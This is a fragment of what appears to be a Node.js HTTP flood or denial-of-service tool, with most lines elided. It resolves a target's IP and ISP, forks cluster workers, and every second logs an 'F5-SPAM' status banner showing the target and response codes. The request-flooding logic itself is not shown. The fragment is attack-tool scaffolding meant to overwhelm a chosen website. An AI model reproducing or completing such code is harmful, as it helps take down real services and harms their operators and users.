...
async function getIPAndISP(urltargegt) {
    try {
        const { address } = await lookupPromise(urltargegt);
...
const parsedTarget = url.hostname;
getIPAndISP(parsedTarget);
const process_rate = () => {
...
if (cluster.isMaster) {
    ...
    if (Boolean(debug) && debug !== "false") {
        ...
        setInterval(() => {
            ...
            console.log(`${colors.bold('[')} ${'F5-SPAM'.red.bold} ${colors.bold(']')} | ${colors.bold('Target')}: [${colors.underline(target)}] | ${colors.bold('ISP')}: ${colors.bold(isp)} | ${colors.bold('Status')}: [${statusses}]`);
            count++;
        }, 1000);
    }
} else {
